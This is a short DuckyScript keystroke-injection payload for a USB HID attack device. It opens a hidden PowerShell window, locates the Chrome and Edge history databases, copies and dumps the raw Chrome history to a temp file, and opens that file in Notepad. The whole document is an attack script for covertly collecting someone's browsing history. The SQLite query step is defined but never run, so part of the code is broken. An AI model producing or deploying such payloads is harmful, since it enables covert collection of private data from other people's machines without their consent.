DELAY 700
STRING powershell -windowstyle hidden
ENTER

STRING $out = '=== Browser History ===' + [char]10
ENTER
STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
ENTER
STRING $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
ENTER
STRING foreach ($db in @($chrome,$edge)) { if (Test-Path $db) { $tmp = "$env:TEMP\hist_tmp"; Copy-Item $db $tmp -Force; $q = "SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"; Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -EA SilentlyContinue } }
ENTER
DELAY 1000
STRING $out += (Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Raw -EA SilentlyContinue) + [char]10
ENTER
STRING $out | Out-File "$env:TEMP\browser_history.txt" -Force
ENTER
STRING Start-Process notepad "$env:TEMP\browser_history.txt"
